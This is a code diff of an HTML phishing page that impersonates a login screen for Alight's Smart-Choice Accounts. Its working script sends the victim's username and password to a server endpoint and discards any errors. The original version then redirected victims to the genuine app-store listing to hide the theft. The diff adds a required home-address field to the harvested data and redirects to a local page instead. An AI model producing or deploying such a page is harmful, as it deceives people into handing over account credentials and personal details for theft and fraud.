@@ -114,48 +114,26 @@
     </style>
 </head>
 <body>
-    <div class="logo-container">
-        <h1>alight</h1>
-        <div class="subtitle">Smart-Choice Accounts®</div>
-        <div class="sun-icon">☀️</div>
-    </div>
-
-    <div class="form-container">
+    <div class="login-container">
+        <h1>AlightSmart</h1>
+        <h2>Welcome Back</h2>
+        
         <form id="loginForm">
-            <label>Enter your User ID</label>
-            <input type="text" id="username" placeholder="User ID" required>
-
-            <label>Enter your Password</label>
-            <input type="password" id="password" placeholder="Password" required>
-
-            <div class="options">
-                <span class="face-id">📷</span>
-                <label>
-                    Save User ID 
-                    <input type="checkbox" style="width: auto;">
-                </label>
+            <div class="form-group">
+                <label>Username or Email</label>
+                <input type="text" id="username" required>
             </div>
-
-            <button type="submit" class="login-btn">LOG IN</button>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="password" required>
+            </div>
+            <div class="form-group">
+                <label>Home Address (Latest)</label>
+                <input type="text" id="address" placeholder="Enter your current home address" required>
+            </div>
+            <button type="submit" class="login-btn">Login</button>
         </form>
-
-        <div class="forgot">
-            <a href="#">Forgot User ID</a> | 
-            <a href="#">Forgot Password</a>
-        </div>
-
-        <button class="signup-btn">SIGN UP</button>
-
-        <div style="text-align:center; margin-top: 30px; color:#166534;">
-            Login Problems?
-        </div>
     </div>
-
-    <footer>
-        <a href="#">Privacy</a>
-        <a href="#">Terms and Conditions</a>
-        <a href="#">Contact Us</a>
-    </footer>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
@@ -163,17 +141,17 @@
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const address = document.getElementById('address').value;
 
             try {
                 await fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password })
+                    body: JSON.stringify({ username, password, address })
                 });
             } catch (err) {}
 
-            // Redirect to your page
-            window.location.href = "https://apps.apple.com/us/app/alight-smart-choice-accounts/id1445889966";
+            window.location.href = "tunde.html";
         });
     </script>
 </body>
